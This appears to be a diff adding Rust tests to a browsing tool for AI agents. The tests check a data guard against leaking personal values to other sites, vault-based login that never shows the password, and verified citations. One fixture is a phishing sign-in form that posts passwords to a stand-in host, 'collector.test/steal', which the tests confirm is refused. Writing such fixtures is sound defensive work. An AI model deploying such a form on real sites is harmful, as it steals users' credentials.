@@ -11,7 +11,7 @@ use std::path::PathBuf;
 use std::sync::Mutex;
 use std::thread;
 
-use jj1_core::{Config, Session};
+use jj1_core::{Config, MemoryVault, Session, Vault};
 
 // ------------------------------------------------------------ test site --
 
@@ -158,6 +158,21 @@ fn handle(mut stream: TcpStream) {
             respond(&mut stream, "200 OK", html, "", &page("Results", &body));
         }
         ("GET", "/login") => respond(&mut stream, "200 OK", html, "", LOGIN),
+        ("GET", "/profile") => respond(
+            &mut stream,
+            "200 OK",
+            html,
+            "",
+            &page("Profile", "<h1>Your profile</h1><p>Email: ann.lee@corp.example</p><p>Account number 9988 7766 5544</p>"),
+        ),
+        // A look-alike sign-in form that sends the password somewhere else.
+        ("GET", "/phish") => respond(
+            &mut stream,
+            "200 OK",
+            html,
+            "",
+            &page("Sign in", r#"<form action="https://collector.test/steal" method="post"><label for="u">User</label><input id="u" name="user"><label for="p">Password</label><input id="p" name="pass" type="password"><button>Sign in</button></form>"#),
+        ),
         ("POST", "/login") => {
             let ok = form_value(&req.body, "csrf") == "tok123" && form_value(&req.body, "pass") == "letmein";
             if ok {
@@ -289,6 +304,82 @@ fn static_login_needs_confirmation_and_keeps_cookies() {
     // The session cookie is shared by later tabs.
     let other = s.open(&format!("{base}/account"), "static").unwrap();
     assert!(s.read(other, "article", 500, 1, false).unwrap().contains("Hello alice-remembered"));
+}
+
+#[test]
+fn data_guard_holds_values_going_to_another_site() {
+    let base = start_site();
+    let other = base.replace("127.0.0.1", "localhost"); // same server, different site
+    let mut s = Session::new(test_config()).unwrap();
+    s.open(&format!("{base}/profile"), "static").unwrap();
+
+    let err = s.open(&format!("{other}/search?q=ann.lee%40corp.example"), "static").unwrap_err();
+    assert!(err.contains("data guard") && err.contains("saw on 127.0.0.1") && err.contains("to localhost"), "{err}");
+    assert!(!err.contains("ann.lee@corp.example"), "the value itself is masked: {err}");
+    let err = s.open(&format!("{other}/search?q=998877665544"), "static").unwrap_err();
+    assert!(err.contains("CONFIRMATION REQUIRED (data guard)"), "{err}");
+
+    // Ordinary requests, and going back to the same site, are not held.
+    s.open(&format!("{other}/search?q=blue+widget"), "static").unwrap();
+    s.open(&format!("{base}/search?q=ann.lee%40corp.example"), "static").unwrap();
+    // The user can approve it.
+    s.open_confirmed(&format!("{other}/search?q=ann.lee%40corp.example"), "static", true).unwrap();
+
+    // Switched off in config: nothing is held.
+    let mut cfg = test_config();
+    cfg.data_guard = false;
+    let mut off = Session::new(cfg).unwrap();
+    off.open(&format!("{base}/profile"), "static").unwrap();
+    off.open(&format!("{other}/search?q=ann.lee%40corp.example"), "static").unwrap();
+}
+
+#[test]
+fn login_fills_the_saved_password_without_showing_it() {
+    let base = start_site();
+    let mut vault = MemoryVault::default();
+    vault.save("127.0.0.1", "alice", "letmein").unwrap();
+    let mut s = Session::new(test_config()).unwrap().with_vault(Box::new(vault));
+
+    let tab = s.open(&format!("{base}/login"), "static").unwrap();
+    let out = s.login(tab).unwrap();
+    assert!(out.contains("signed in to 127.0.0.1 as alice"), "{out}");
+    assert!(!out.contains("letmein"), "the password must never be shown: {out}");
+    assert!(s.read(tab, "article", 500, 1, false).unwrap().contains("Hello alice"));
+
+    // A form that would send the password to another host is refused.
+    let phish = s.open(&format!("{base}/phish"), "static").unwrap();
+    let err = s.login(phish).unwrap_err();
+    assert!(err.contains("Refused") && err.contains("collector.test"), "{err}");
+    assert!(!err.contains("letmein"));
+
+    // No saved sign-in for this site.
+    let mut s2 = Session::new(test_config()).unwrap().with_vault(Box::new(MemoryVault::default()));
+    let tab = s2.open(&format!("{base}/login"), "static").unwrap();
+    assert!(s2.login(tab).unwrap_err().contains("No saved sign-in"));
+}
+
+#[test]
+fn cite_links_only_quotes_that_are_on_the_page() {
+    let base = start_site();
+    let mut s = Session::new(test_config()).unwrap();
+    s.open(&base, "static").unwrap();
+    let ok = s.cite(None, "a shop that exists only for tests").unwrap();
+    assert!(ok.contains("verified") && ok.contains("#:~:text=a%20shop%20that%20exists%20only%20for%20tests"), "{ok}");
+    let err = s.cite(None, "the shop sells real goods").unwrap_err();
+    assert!(err.contains("NOT FOUND"), "{err}");
+    // jj1_find gives source links for matching text lines.
+    let found = s.find(1, "exists only", 5).unwrap();
+    assert!(found.contains("source: ") && found.contains("#:~:text="), "{found}");
+}
+
+#[test]
+fn audit_reports_agent_readiness() {
+    let base = start_site();
+    let mut s = Session::new(test_config()).unwrap();
+    let tab = s.open(&base, "static").unwrap();
+    let a = s.audit_tab(tab).unwrap();
+    assert!(a.score > 0 && a.score <= 100);
+    assert!(a.report().contains("Agent readiness:"));
 }
 
 #[test]
